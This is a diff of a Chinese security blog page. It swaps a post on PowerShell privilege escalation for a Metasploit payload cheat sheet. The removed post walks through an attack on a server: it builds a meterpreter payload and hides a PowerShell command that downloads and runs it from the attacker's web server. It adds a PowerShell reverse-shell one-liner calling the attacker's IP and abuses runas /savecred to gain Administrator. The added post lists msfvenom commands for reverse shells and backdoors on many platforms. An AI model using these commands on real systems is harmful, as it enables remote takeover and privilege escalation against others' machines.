@@ -11,7 +11,7 @@
 
     <title>
         
-        windows渗透之powershell提权 - undefined
+        Metasploit常用的Payload - undefined
         
     </title>
 
@@ -87,7 +87,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-text">windows渗透之powershell提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#undefined"><span class="toc-text">攻击机:10.10.14.158</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#undefined"><span class="toc-text">服务器:10.10.10.98</span></a></li></ol></li></ol>
+    
 </div>
     
 </div>
@@ -117,15 +117,15 @@
 
 <div class="post-container">
     <div class="post-title">
-        windows渗透之powershell提权
+        Metasploit常用的Payload
     </div>
 
     <div class="post-meta">
-        <span class="attr">Post：<span>2019-02-18 16:47:18</span></span>
+        <span class="attr">Post：<span>2019-02-24 05:28:26</span></span>
         
         <span class="attr">Tags：/
         
-        <a class="tag" href="/tags/#windows提权" title="windows提权">windows提权</a>
+        <a class="tag" href="/tags/#Metasploit" title="Metasploit">Metasploit</a>
         <span>/</span>
         
         
@@ -135,9 +135,24 @@
 
     </div>
     <div class="post-content ">
-        <p></p><h3>windows渗透之powershell提权</h3><p></p>
-<p></p><h5>攻击机:10.10.14.158</h5><p></p>
-<p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\new.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>
+        <p>#####Metasploit最有用的能力之一就是msfpayload模块。使用msfpayload模块基本可以生成市场上各种系统、语言的payloads。</p>
+<p>######列出有效payloads<br><code>msfvenom -l</code></p>
+<p>######Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>
+<p>######Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>
+<p>######Mac<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>
+<p>######Android<br><code>msfpayload android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; android_backdoor.apk</code></p>
+<p>######PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>
+<p>######ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p>
+<p>######JSP<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p>
+<p>######WAR<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p>
+<p>######Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p>
+<p>######Bash<br><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p>
+<p>######Perl<br><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p>
+<p>######Linux Shellcode<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>
+<p>######Windows Shellcode<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>
+<p>######MAC Shellcode<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>
+<p>连接Payloads:<br><code>use exploit/multi/handler</code><br><code>set payload linux/x86/meterpreter/bind_tcp</code><br><code>set RHOST 192.168.10.1</code><br><code>set LPORT 4444</code><br><code>exploit</code></p>
 
         
         <br>
